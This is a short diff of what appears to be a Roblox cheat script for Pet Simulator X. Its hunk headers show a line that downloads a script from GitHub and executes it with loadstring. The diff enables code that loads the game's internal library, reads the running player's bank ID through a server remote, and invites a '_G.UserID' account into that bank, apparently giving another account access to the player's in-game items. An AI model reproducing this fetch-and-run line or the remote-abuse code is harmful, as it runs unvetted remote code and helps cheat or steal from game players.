@@ -58,10 +58,10 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/S
 
 -- Bank ID and Library
 
---local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
---local mybanks = getmybanksremote:InvokeServer()
---local BankID = mybanks[1]['BUID']
---local Bank = BankID
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mybanks = getmybanksremote:InvokeServer()
+local BankID = mybanks[1]['BUID']
+local Bank = BankID
 
 -- Bank ID and Library End
 
@@ -69,7 +69,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/S
 
 -- Invites Scripts ( Dont Change if u dont know any )
 
---inviteremote:InvokeServer(mybanks[1]['BUID'], _G.UserID)
+inviteremote:InvokeServer(mybanks[1]['BUID'], _G.UserID)
 
 --inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
 
